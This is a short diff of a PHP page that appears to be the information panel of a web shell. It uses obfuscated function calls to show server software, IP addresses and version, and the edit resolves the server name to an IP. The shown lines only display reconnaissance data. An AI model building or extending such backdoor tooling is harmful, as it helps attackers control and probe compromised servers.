@@ -351,7 +351,7 @@ button, input, optgroup, select, textarea {
  </div>
  <div class="bg-dark border mt-2">
    <span class="mb-1 px-1 mt-1"><font color="#00bfff"> Software : </font><font color="lime"><?= $c8[0]() ?></font></span><br>
-   <span class="mb-1 px-1 mt-1"><font color="#00bfff"> Server IP : </font><font color="lime"><?php echo $_SERVER['SERVER_NAME']; ?></font></span><br>
+   <span class="mb-1 px-1 mt-1"><font color="#00bfff"> Server IP : </font><font color="lime"><?php echo gethostbyname($_SERVER['SERVER_NAME']); ?></font></span><br>
    <span class="mb-1 px-1 mt-1"><font color="#00bfff"> Your IP : </font><font color="lime"><?php echo $_SERVER['REMOTE_ADDR']; ?></font></span><br>
    <span class="mb-1 px-1 mt-1"><font color="#00bfff"> Server : </font><font color="lime"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></font></span><br>
    <span class="mb-1 px-1 mt-1"><font color="#00bfff"> Version : </font><font color="lime"><?= $c8[1]() ?></font></span>
